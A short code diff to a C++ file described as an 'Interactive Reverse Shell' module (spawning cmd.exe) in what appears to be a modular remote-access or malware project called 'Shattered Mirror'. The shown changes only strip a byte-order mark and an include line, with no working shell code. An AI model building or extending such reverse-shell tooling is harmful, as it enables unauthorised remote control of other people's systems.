@@ -1,4 +1,4 @@
-﻿/*=============================================================================
+/*=============================================================================
  * Shattered Mirror v1 — Atom 10: Interactive Reverse Shell
  *
  * Implements a full interactive shell by spawning a child process (cmd.exe)
@@ -14,7 +14,6 @@
 
 #include "Atom_10_Shell.h"
 #include "../Orchestrator/AtomManager.h"
-#include "Atom_03_Sys.h"
 #include <cstring>
 
 #define BUFFER_SIZE 8192
